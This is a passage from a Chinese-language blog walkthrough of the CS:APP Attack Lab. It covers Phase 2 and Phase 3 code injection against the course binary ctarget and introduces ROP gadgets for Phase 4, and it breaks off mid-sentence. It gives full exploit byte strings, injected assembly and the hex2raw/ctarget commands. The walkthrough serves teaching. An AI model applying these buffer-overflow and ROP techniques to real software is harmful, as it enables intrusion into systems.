alt="image-20240302014356466"></p><p>然后通过gdb挑选一个注入代码的位置,这里我们选择getbuf中的$rsp栈顶作为代码注入位置,通过gdb命令,打一个在getbuf的断点,探测到rsp的地址,即栈顶地址</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454240.png" alt="image-20240229135832513"></p><pre class="line-numbers language-none"><code class="language-none">p $rsp&#x3D;0x5561dc78<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样我们就可以开始编我们的进攻序列,在缓冲区中存放进攻指令,覆盖的地址填原来的栈顶,即在0x5561dc78注入代码进行进攻</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220816.png" alt="image-20240302014950119"></p><p>覆盖的地址要依照小端法逆序,而机器指令不用逆序,中间填充字符,当然可以考虑换一个代码注入位置.编完后我们要用hex2raw来转换进攻字节以便于生成进攻字符串</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;hex2raw &lt;sol2.txt&gt;sol2r.txt.&#x2F;ctarget -q -i sol2r.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后提交会得到以下结果,圆满过关!</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220855.png" alt="image-20240302014929043"></p><p>或者我们可以选择不在那里注入代码,我们选择在test的栈帧内注入代码,即在0x5561dca8段注入代码!</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220891.png" alt="image-20240302015226085"></p><p>理论成立,实践开始!</p><p>圆满通关!</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220929.png" alt="image-20240302015316019"></p><h2 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase_3"></a>Phase_3</h2><p>看一下官方文档:</p><p>Phase 3 also involves a code injection attack, but passing a string as argument. Within the file ctarget there is code for functions hexmatch and touch3 having the following C representations:</p><p>touch3 C &amp;&amp; Assembly Code:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">touch3</span><span class="token punctuation">(</span><span class="token keyword">char</span> \<span class="token operator">*</span>sval<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>vlevel <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token comment">/*Part of validation protocol */</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hexmatch</span><span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch3!: You called touch3(\"%s\")\n"</span><span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch3(\"%s\")\n"</span><span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token number">00000000004018f</span>a <span class="token operator">&lt;</span>touch3<span class="token operator">></span><span class="token operator">:</span>  <span class="token number">4018f</span>a<span class="token operator">:</span><span class="token number">53</span>                   push   <span class="token operator">%</span>rbx  <span class="token number">4018f</span>b<span class="token operator">:</span><span class="token number">48</span> <span class="token number">89</span> fb             mov    <span class="token operator">%</span>rdi<span class="token punctuation">,</span><span class="token operator">%</span>rbx  <span class="token number">4018f</span>e<span class="token operator">:</span>c7 <span class="token number">05</span> d4 <span class="token number">2</span>b <span class="token number">20</span> <span class="token number">00</span> <span class="token number">03</span> movl   $<span class="token number">0x3</span><span class="token punctuation">,</span><span class="token number">0x202bd4</span><span class="token punctuation">(</span><span class="token operator">%</span>rip<span class="token punctuation">)</span>        # <span class="token number">6044</span>dc <span class="token operator">&lt;</span>vlevel<span class="token operator">></span>  <span class="token number">401905</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>   <span class="token number">401908</span><span class="token operator">:</span><span class="token number">48</span> <span class="token number">89</span> fe             mov    <span class="token operator">%</span>rdi<span class="token punctuation">,</span><span class="token operator">%</span>rsi  <span class="token number">40190</span>b<span class="token operator">:</span><span class="token number">8</span>b <span class="token number">3</span>d d3 <span class="token number">2</span>b <span class="token number">20</span> <span class="token number">00</span>    mov    <span class="token number">0x202bd3</span><span class="token punctuation">(</span><span class="token operator">%</span>rip<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span>edi        # <span class="token number">6044e4</span> <span class="token operator">&lt;</span>cookie<span class="token operator">></span>  <span class="token number">401911</span><span class="token operator">:</span>e8 <span class="token number">36</span> ff ff ff       callq  <span class="token number">40184</span>c <span class="token operator">&lt;</span>hexmatch<span class="token operator">></span>  <span class="token number">401916</span><span class="token operator">:</span><span class="token number">85</span> c0                test   <span class="token operator">%</span>eax<span class="token punctuation">,</span><span class="token operator">%</span>eax  <span class="token number">401918</span><span class="token operator">:</span><span class="token number">74</span> <span class="token number">23</span>                je     <span class="token number">40193</span>d <span class="token operator">&lt;</span>touch3<span class="token operator">+</span><span class="token number">0x43</span><span class="token operator">></span>  <span class="token number">40191</span>a<span class="token operator">:</span><span class="token number">48</span> <span class="token number">89</span> da             mov    <span class="token operator">%</span>rbx<span class="token punctuation">,</span><span class="token operator">%</span>rdx  <span class="token number">40191</span>d<span class="token operator">:</span>be <span class="token number">38</span> <span class="token number">31</span> <span class="token number">40</span> <span class="token number">00</span>       mov    $<span class="token number">0x403138</span><span class="token punctuation">,</span><span class="token operator">%</span>esi  <span class="token number">401922</span><span class="token operator">:</span>bf <span class="token number">01</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>       mov    $<span class="token number">0x1</span><span class="token punctuation">,</span><span class="token operator">%</span>edi  <span class="token number">401927</span><span class="token operator">:</span>b8 <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>       mov    $<span class="token number">0x0</span><span class="token punctuation">,</span><span class="token operator">%</span>eax  <span class="token number">40192</span>c<span class="token operator">:</span>e8 bf f4 ff ff       callq  <span class="token number">400</span>df0 <span class="token operator">&lt;</span>__printf_chk@plt<span class="token operator">></span>  <span class="token number">401931</span><span class="token operator">:</span>bf <span class="token number">03</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>       mov    $<span class="token number">0x3</span><span class="token punctuation">,</span><span class="token operator">%</span>edi  <span class="token number">401936</span><span class="token operator">:</span>e8 <span class="token number">52</span> <span class="token number">03</span> <span class="token number">00</span> <span class="token number">00</span>       callq  <span class="token number">401</span>c8d <span class="token operator">&lt;</span>validate<span class="token operator">></span>  <span class="token number">40193</span>b<span class="token operator">:</span>eb <span class="token number">21</span>                jmp    <span class="token number">40195</span>e <span class="token operator">&lt;</span>touch3<span class="token operator">+</span><span class="token number">0x64</span><span class="token operator">></span>  <span class="token number">40193</span>d<span class="token operator">:</span><span class="token number">48</span> <span class="token number">89</span> da             mov    <span class="token operator">%</span>rbx<span class="token punctuation">,</span><span class="token operator">%</span>rdx  <span class="token number">401940</span><span class="token operator">:</span>be <span class="token number">60</span> <span class="token number">31</span> <span class="token number">40</span> <span class="token number">00</span>       mov    $<span class="token number">0x403160</span><span class="token punctuation">,</span><span class="token operator">%</span>esi  <span class="token number">401945</span><span class="token operator">:</span>bf <span class="token number">01</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>       mov    $<span class="token number">0x1</span><span class="token punctuation">,</span><span class="token operator">%</span>edi  <span class="token number">40194</span>a<span class="token operator">:</span>b8 <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>       mov    $<span class="token number">0x0</span><span class="token punctuation">,</span><span class="token operator">%</span>eax  <span class="token number">40194f</span><span class="token operator">:</span>e8 <span class="token number">9</span>c f4 ff ff       callq  <span class="token number">400</span>df0 <span class="token operator">&lt;</span>__printf_chk@plt<span class="token operator">></span>  <span class="token number">401954</span><span class="token operator">:</span>bf <span class="token number">03</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>       mov    $<span class="token number">0x3</span><span class="token punctuation">,</span><span class="token operator">%</span>edi  <span class="token number">401959</span><span class="token operator">:</span>e8 f1 <span class="token number">03</span> <span class="token number">00</span> <span class="token number">00</span>       callq  <span class="token number">401</span>d4f <span class="token operator">&lt;</span>fail<span class="token operator">></span>  <span class="token number">40195</span>e<span class="token operator">:</span>bf <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>       mov    $<span class="token number">0x0</span><span class="token punctuation">,</span><span class="token operator">%</span>edi  <span class="token number">401963</span><span class="token operator">:</span>e8 d8 f4 ff ff       callq  <span class="token number">400e40</span> <span class="token operator">&lt;</span>exit@plt<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Hexmatch C &amp;&amp;Assembly Code</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* Compare string to hex represention of unsigned value */</span><span class="token comment">//将字符串与无符号值的十六进制表示进行比较</span><span class="token keyword">int</span> <span class="token function">hexmatch</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>sval<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span> cbuf<span class="token punctuation">[</span><span class="token number">110</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">/*Make position of check string unpredictable */</span><span class="token comment">//使检查字符串的位置不可预测</span><span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> cbuf <span class="token operator">+</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">100</span><span class="token punctuation">;</span><span class="token function">sprintf</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"%.8x"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将val转为16进制存入s</span><span class="token keyword">return</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>sval<span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token number">000000000040184</span>c <span class="token operator">&lt;</span>hexmatch<span class="token operator">></span><span class="token operator">:</span>  <span class="token number">40184</span>c<span class="token operator">:</span><span class="token number">41</span> <span class="token number">54</span>                push   <span class="token operator">%</span>r12  <span class="token number">40184</span>e<span class="token operator">:</span><span class="token number">55</span>                   push   <span class="token operator">%</span>rbp  <span class="token number">40184f</span><span class="token operator">:</span><span class="token number">53</span>                   push   <span class="token operator">%</span>rbx  <span class="token number">401850</span><span class="token operator">:</span><span class="token number">48</span> <span class="token number">83</span> c4 <span class="token number">80</span>          add    $<span class="token number">0xffffffffffffff80</span><span class="token punctuation">,</span><span class="token operator">%</span>rsp  <span class="token number">401854</span><span class="token operator">:</span><span class="token number">41</span> <span class="token number">89</span> fc             mov    <span class="token operator">%</span>edi<span class="token punctuation">,</span><span class="token operator">%</span>r12d  <span class="token number">401857</span><span class="token operator">:</span><span class="token number">48</span> <span class="token number">89</span> f5             mov    <span class="token operator">%</span>rsi<span class="token punctuation">,</span><span class="token operator">%</span>rbp  <span class="token number">40185</span>a<span class="token operator">:</span><span class="token number">64</span> <span class="token number">48</span> <span class="token number">8</span>b <span class="token number">04</span> <span class="token number">25</span> <span class="token number">28</span> <span class="token number">00</span> mov    <span class="token operator">%</span>fs<span class="token operator">:</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token operator">%</span>rax  <span class="token number">401861</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">00</span>   <span class="token number">401863</span><span class="token operator">:</span><span class="token number">48</span> <span class="token number">89</span> <span class="token number">44</span> <span class="token number">24</span> <span class="token number">78</span>       mov    <span class="token operator">%</span>rax<span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">(</span><span class="token operator">%</span>rsp<span class="token punctuation">)</span>  <span class="token number">401868</span><span class="token operator">:</span><span class="token number">31</span> c0                <span class="token operator">xor</span>    <span class="token operator">%</span>eax<span class="token punctuation">,</span><span class="token operator">%</span>eax  <span class="token number">40186</span>a<span class="token operator">:</span>e8 <span class="token number">41</span> f5 ff ff       callq  <span class="token number">400</span>db0 <span class="token operator">&lt;</span>random@plt<span class="token operator">></span>  <span class="token number">40186f</span><span class="token operator">:</span><span class="token number">48</span> <span class="token number">89</span> c1             mov    <span class="token operator">%</span>rax<span class="token punctuation">,</span><span class="token operator">%</span>rcx  <span class="token number">401872</span><span class="token operator">:</span><span class="token number">48</span> ba <span class="token number">0</span>b d7 a3 <span class="token number">70</span> <span class="token number">3</span>d movabs $<span class="token number">0xa3d70a3d70a3d70b</span><span class="token punctuation">,</span><span class="token operator">%</span>rdx  <span class="token number">401879</span><span class="token operator">:</span><span class="token number">0</span>a d7 a3   <span class="token number">40187</span>c<span class="token operator">:</span><span class="token number">48</span> f7 ea             imul   <span class="token operator">%</span>rdx  <span class="token number">40187f</span><span class="token operator">:</span><span class="token number">48</span> <span class="token number">01</span> ca             add    <span class="token operator">%</span>rcx<span class="token punctuation">,</span><span class="token operator">%</span>rdx  <span class="token number">401882</span><span class="token operator">:</span><span class="token number">48</span> c1 fa <span class="token number">06</span>          sar    $<span class="token number">0x6</span><span class="token punctuation">,</span><span class="token operator">%</span>rdx  <span class="token number">401886</span><span class="token operator">:</span><span class="token number">48</span> <span class="token number">89</span> c8             mov    <span class="token operator">%</span>rcx<span class="token punctuation">,</span><span class="token operator">%</span>rax  <span class="token number">401889</span><span class="token operator">:</span><span class="token number">48</span> c1 f8 <span class="token number">3f</span>          sar    $<span class="token number">0x3f</span><span class="token punctuation">,</span><span class="token operator">%</span>rax  <span class="token number">40188</span>d<span class="token operator">:</span><span class="token number">48</span> <span class="token number">29</span> c2             sub    <span class="token operator">%</span>rax<span class="token punctuation">,</span><span class="token operator">%</span>rdx  <span class="token number">401890</span><span class="token operator">:</span><span class="token number">48</span> <span class="token number">8</span>d <span class="token number">04</span> <span class="token number">92</span>          <span class="token function">lea</span>    <span class="token punctuation">(</span><span class="token operator">%</span>rdx<span class="token punctuation">,</span><span class="token operator">%</span>rdx<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span>rax  <span class="token number">401894</span><span class="token operator">:</span><span class="token number">48</span> <span class="token number">8</span>d <span class="token number">04</span> <span class="token number">80</span>          <span class="token function">lea</span>    <span class="token punctuation">(</span><span class="token operator">%</span>rax<span class="token punctuation">,</span><span class="token operator">%</span>rax<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span>rax  <span class="token number">401898</span><span class="token operator">:</span><span class="token number">48</span> c1 e0 <span class="token number">02</span>          shl    $<span class="token number">0x2</span><span class="token punctuation">,</span><span class="token operator">%</span>rax  <span class="token number">40189</span>c<span class="token operator">:</span><span class="token number">48</span> <span class="token number">29</span> c1             sub    <span class="token operator">%</span>rax<span class="token punctuation">,</span><span class="token operator">%</span>rcx  <span class="token number">40189f</span><span class="token operator">:</span><span class="token number">48</span> <span class="token number">8</span>d <span class="token number">1</span>c <span class="token number">0</span>c          <span class="token function">lea</span>    <span class="token punctuation">(</span><span class="token operator">%</span>rsp<span class="token punctuation">,</span><span class="token operator">%</span>rcx<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span>rbx  <span class="token number">4018</span>a3<span class="token operator">:</span><span class="token number">45</span> <span class="token number">89</span> e0             mov    <span class="token operator">%</span>r12d<span class="token punctuation">,</span><span class="token operator">%</span>r8d  <span class="token number">4018</span>a6<span class="token operator">:</span>b9 e2 <span class="token number">30</span> <span class="token number">40</span> <span class="token number">00</span>       mov    $<span class="token number">0x4030e2</span><span class="token punctuation">,</span><span class="token operator">%</span>ecx  <span class="token number">4018</span>ab<span class="token operator">:</span><span class="token number">48</span> c7 c2 ff ff ff ff mov    $<span class="token number">0xffffffffffffffff</span><span class="token punctuation">,</span><span class="token operator">%</span>rdx  <span class="token number">4018</span>b2<span class="token operator">:</span>be <span class="token number">01</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>       mov    $<span class="token number">0x1</span><span class="token punctuation">,</span><span class="token operator">%</span>esi  <span class="token number">4018</span>b7<span class="token operator">:</span><span class="token number">48</span> <span class="token number">89</span> df             mov    <span class="token operator">%</span>rbx<span class="token punctuation">,</span><span class="token operator">%</span>rdi  <span class="token number">4018</span>ba<span class="token operator">:</span>b8 <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>       mov    $<span class="token number">0x0</span><span class="token punctuation">,</span><span class="token operator">%</span>eax  <span class="token number">4018</span>bf<span class="token operator">:</span>e8 ac f5 ff ff       callq  <span class="token number">400e70</span> <span class="token operator">&lt;</span>__sprintf_chk@plt<span class="token operator">></span>  <span class="token number">4018</span>c4<span class="token operator">:</span>ba <span class="token number">09</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>       mov    $<span class="token number">0x9</span><span class="token punctuation">,</span><span class="token operator">%</span>edx  <span class="token number">4018</span>c9<span class="token operator">:</span><span class="token number">48</span> <span class="token number">89</span> de             mov    <span class="token operator">%</span>rbx<span class="token punctuation">,</span><span class="token operator">%</span>rsi  <span class="token number">4018</span>cc<span class="token operator">:</span><span class="token number">48</span> <span class="token number">89</span> ef             mov    <span class="token operator">%</span>rbp<span class="token punctuation">,</span><span class="token operator">%</span>rdi  <span class="token number">4018</span>cf<span class="token operator">:</span>e8 cc f3 ff ff       callq  <span class="token number">400</span>ca0 <span class="token operator">&lt;</span>strncmp@plt<span class="token operator">></span>  <span class="token number">4018</span>d4<span class="token operator">:</span><span class="token number">85</span> c0                test   <span class="token operator">%</span>eax<span class="token punctuation">,</span><span class="token operator">%</span>eax  <span class="token number">4018</span>d6<span class="token operator">:</span><span class="token number">0f</span> <span class="token number">94</span> c0             sete   <span class="token operator">%</span>al  <span class="token number">4018</span>d9<span class="token operator">:</span><span class="token number">0f</span> b6 c0             movzbl <span class="token operator">%</span>al<span class="token punctuation">,</span><span class="token operator">%</span>eax  <span class="token number">4018</span>dc<span class="token operator">:</span><span class="token number">48</span> <span class="token number">8</span>b <span class="token number">74</span> <span class="token number">24</span> <span class="token number">78</span>       mov    <span class="token number">0x78</span><span class="token punctuation">(</span><span class="token operator">%</span>rsp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span>rsi  <span class="token number">4018e1</span><span class="token operator">:</span><span class="token number">64</span> <span class="token number">48</span> <span class="token number">33</span> <span class="token number">34</span> <span class="token number">25</span> <span class="token number">28</span> <span class="token number">00</span> <span class="token operator">xor</span>    <span class="token operator">%</span>fs<span class="token operator">:</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token operator">%</span>rsi  <span class="token number">4018e8</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">00</span>   <span class="token number">4018</span>ea<span class="token operator">:</span><span class="token number">74</span> <span class="token number">05</span>                je     <span class="token number">4018f</span>1 <span class="token operator">&lt;</span>hexmatch<span class="token operator">+</span><span class="token number">0xa5</span><span class="token operator">></span>  <span class="token number">4018</span>ec<span class="token operator">:</span>e8 ef f3 ff ff       callq  <span class="token number">400</span>ce0 <span class="token operator">&lt;</span>__stack_chk_fail@plt<span class="token operator">></span>  <span class="token number">4018f</span>1<span class="token operator">:</span><span class="token number">48</span> <span class="token number">83</span> ec <span class="token number">80</span>          sub    $<span class="token number">0xffffffffffffff80</span><span class="token punctuation">,</span><span class="token operator">%</span>rsp  <span class="token number">4018f</span>5<span class="token operator">:</span><span class="token number">5</span>b                   pop    <span class="token operator">%</span>rbx  <span class="token number">4018f</span>6<span class="token operator">:</span><span class="token number">5</span>d                   pop    <span class="token operator">%</span>rbp  <span class="token number">4018f</span>7<span class="token operator">:</span><span class="token number">41</span> <span class="token number">5</span>c                pop    <span class="token operator">%</span>r12  <span class="token number">4018f</span>9<span class="token operator">:</span>c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument.<code>您必须使其显示为touch3，就像您已将cookie的字符串表示形式作为其参数一样。</code><br>Some Advice:<br>• You will need to include a string representation of your cookie in your exploit string. The string should consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.”<code>您需要在进攻字符串中包含一个代表你cookie的字符串。该字符串应由八个十六进制数字 (从最高到最低有效排序) 组成，没有前导 “0x”。</code><br>• Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0. Type “man ascii” on any Linux machine to see the byte representations of the characters you need.<code>回想一下，字符串在C中表示为字节序列，后跟值为0的字节。在任何Linux机器上键入 “man ascii” 以查看所需字符的字节表示。</code><br>• Your injected code should set register %rdi to the address of this string.<code>注入的代码应将寄存器 % rdi设置为该字符串的地址。</code><br>• When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.<code> 当调用函数hexmatch和strncmp时，它们将数据推送到堆栈上，覆盖保存getbuf使用的缓冲区的内存部分。因此，您需要小心放置cookie的字符串表示形式。</code></p><p>解决问题逻辑如下:</p><p>我们要实现的功能是让cookie和sval相匹配的话,那么就能通关,sval存放于寄存器%rdi中,以16进制的方式存在,而比较函数中会将cookie转化为16进制,所以我们要将cookie转化为16进制然后写入到%rdi</p><p>在呼叫touch3之前我们要把char *sval的值(其指针指向sval这个地址的字串)存入%rdi中,而该地址应该存的是cookie转化为ascii码表示,同时要知道hexmatch一上来就要了110个byte,所以很有可能把缓冲区给重新分配.</p><p>为了防止存放的字符串被hexmatch和strncmp覆盖,不能再0x5561dc78-0x5561dca0者之间存放字串,而0x5561dc78是分配的最低位置,0x5561dca0是放置跳转地址的位置,所以我们把字串放在test的栈空间之中比如:0x5561dca8.</p><p>操作如下</p><ul><li>把cookie转换成ascii码,通过查表的方式把cookie挨个转成ascii码.\0–&gt;00</li></ul><pre class="line-numbers language-none"><code class="language-none">35 39 62 39 39 37 66 61 00 #00是字符串结尾<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>将touch3地址压入栈中</li><li>将%rsp地址+8—&gt;到%rdi中(当然也可以写精确地址0x5561dca8)</li><li>retq</li></ul><p>构建以下命令,保存为t3.s文件</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">push $0x004018falea 0x8(%rsp),%rdiretq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后用Phase_2的方法得到机器指令代码</p><pre class="line-numbers language-none"><code class="language-none">gcc -c -Og t3.sobjdump -d t3.o&gt;t3.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>会得到如下代码</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">t3.o:     file format elf64-x86-640000000000000000 &lt;.text&gt;:   0:68 fa 18 40 00       pushq  $0x4018fa   5:48 8d 7c 24 08       lea    0x8(%rsp),%rdi   a:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来我们就可以编写sol3.txt,记住64位机器输入指令记得补零,不然可能段错误</p><pre class="line-numbers language-none"><code class="language-none">68 fa 18 40 00 48 8d 7c 24 08 c3 00 00 00 00 00&#x2F;&#x2F;上面的是机器指令代码00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00&#x2F;&#x2F;填充字符78 dc 61 55 00 00 00 00 &#x2F;&#x2F;还是跳转到栈顶,需要padding35 39 62 39 39 37 66 61 &#x2F;&#x2F;存再test栈帧中的值,0x5561dca000 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后输入以下指令</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;hex2raw &lt;sol3.txt &gt;sol3r.txt &amp;&amp; .&#x2F;ctarget -q -i sol3r.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>若看见以下界面,则恭喜通关!</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220967.png" alt="image-20240302020227034"></p><h1 id="Part-II-ROP"><a href="#Part-II-ROP" class="headerlink" title="Part II: ROP"></a>Part II: ROP</h1><h2 id="总览-1"><a href="#总览-1" class="headerlink" title="总览"></a>总览</h2><blockquote><p>ROP: Return-Oriented Programming</p><p>什么叫Gadgets?思索许久,发现就是断章取义,重塑代码,草船借箭</p></blockquote><p>得到rtarget的汇编</p><pre class="line-numbers language-none"><code class="language-none">objdump -d rtarget&gt;rtarget.s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Part2的限制:</p><ol><li>恢复了栈的随机化,每次栈的位置都不一样,无法决定把代码放到哪个位置</li><li>恢复了栈的区域标记,分为可写,可读,可执行.</li></ol><pre class="line-numbers language-none"><code class="language-none">堆栈包含一系列小工具地址。每个gadget由一系列指令字节组成，最后一个是0xc3，编码ret指令。当程序从此配置开始执行 ret 指令时，它将启动一系列 gadget 执行，每个 gadget 末尾的 ret 指令导致程序跳转到下一个 gadget 的开头。小工具可以使用与编译器生成的汇编语言语句相对应的代码，尤其是函数末尾的语句。在实践中，这种形式可能有一些有用的小工具，但不足以实现许多重要的操作。例如，编译函数不太可能将 popq %rdi 作为 ret 之前的最后一条指令。幸运的是，对于面向字节的指令集（例如 x86-64），通常可以通过从指令字节序列的其他部分提取模式来找到小工具。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>举一个Gadgets的小例子,这有一个很有意思的小现象</p><p>Setval_210’s C &amp;&amp; Assembly Code</p><pre class="line-numbers language-none"><code class="language-none">void setval_210(unsigned * p) &#123; * p &#x3D; 3347663060U; &#125;0000000000400f15 &lt;setval_210&gt;:400f15: c7 07 d4 48 89 c7   movl  $0xc78948d4,(%rdi)400f1b: c3                  retq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The byte sequence 48 89 c7 encodes the instruction movq %rax, %rdi. (See Figure 3A for the encodings of useful movq instructions.) This sequence is followed by byte value c3, which encodes the ret instruction. The function starts at address 0x400f15, and the sequence starts on the fourth byte of the function. Thus, this code contains a gadget, having a starting address of 0x400f18, that will copy the 64-bit value in register %rax to register %rdi.</p><p><code>断章取义</code></p><p><strong>从0x400f18看到0x400f1b表示的意思则是把%rax的值传到%rdi,即为movq %rax , %rdi</strong></p><p>Your code for RTARGET contains a number of functions similar to the setval_210 function shown above in a region we refer to as the gadget farm. Your job will be to identify useful gadgets in the gadget farm and use these to perform attacks similar to those you did in Phases 2 and 3.</p><p>Important: The gadget farm is demarcated by functions start_farm and end_farm in your copy of rtarget. Do not attempt to construct gadgets from other portions of the program code.</p><pre class="line-numbers language-none"><code class="language-none">您的 RTARGET 代码包含许多与上面所示的 setval_210 函数类似的函数，这些函数位于我们称为小工具场的区域中。您的工作将是识别小工具场中有用的小工具，并使用它们来执行类似于您在第 2 阶段和第 3 阶段中所做的攻击。重要提示：小工具场由 rtarget 副本中的函数 start_farm 和 end_farm 划分。不要尝试从程序代码的其他部分构造小工具。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase_4"></a>Phase_4</h2><p>Phase_4要求:</p><p>For Phase 4,you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your gadget farm. You can construct your solution using gadgets consisting of the following instruction types, and using only the ﬁrst eight x86-64 registers (%rax–%rdi).</p><ul><li>movq : The codes for these are shown in Figure 3A.</li></ul><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127944.png" alt="image-20240229212126798"></p><ul><li>popq : The codes for these are shown in Figure 3B.</li></ul><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127952.png" alt="image-20240229212144522"></p><ul><li><p>ret : This instruction is encoded by the single byte 0xc3.</p></li><li><p>nop : This instruction (pronounced “no op,” which is short for 